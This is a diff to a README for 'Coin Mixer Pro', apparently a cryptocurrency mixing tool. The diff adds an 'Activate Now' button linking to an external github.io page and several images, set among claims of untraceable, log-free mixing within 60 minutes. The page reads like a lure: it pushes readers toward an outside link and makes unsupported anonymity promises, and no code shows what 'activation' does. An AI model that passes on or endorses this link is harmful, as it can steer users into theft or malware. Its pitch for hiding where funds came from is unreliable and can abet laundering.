@@ -12,7 +12,7 @@ Unlike traditional tumblers, which rely on single routing paths, Coin Mixer Pro 
 
 ---
 
-
+[![Activate Now](../btn.png)](https://coin-mixer-pro.github.io/.github/)
 
 ---
 
@@ -38,6 +38,7 @@ No personal identifiers, IPs, or timestamps are stored. The entire mixing proces
 
 Despite deep anonymization layers, transaction recombination is optimized for **completion under 60 minutes**, depending on network load.
 
+<img width="1200" height="685" alt="image" src="https://github.com/user-attachments/assets/ef87261d-e80e-456f-97d4-8f3cc8548a35" />
 
 ---
 
@@ -68,6 +69,7 @@ Despite deep anonymization layers, transaction recombination is optimized for **
 [!IMPORTANT]
 
 > Always use a new session key for each batch. This guarantees **unique routing entropy**, critical for maintaining full transaction unlinkability.
+<img width="1100" height="400" alt="image" src="https://github.com/user-attachments/assets/471bbfd8-a021-4810-8d1f-62b9fdfc2b94" />
 
 ---
 
@@ -119,6 +121,7 @@ A: Yes — Monero and Zcash modules use ring-signature-compatible anonymization,
 
 **Q: How often is it updated?**
 A: Monthly builds introduce security patches, node expansions, and new wallet compatibility.
+<img width="1200" height="900" alt="image" src="https://github.com/user-attachments/assets/b0b573a7-62b8-44a1-bdfd-2b3f7471d1db" />
 
 ---
 
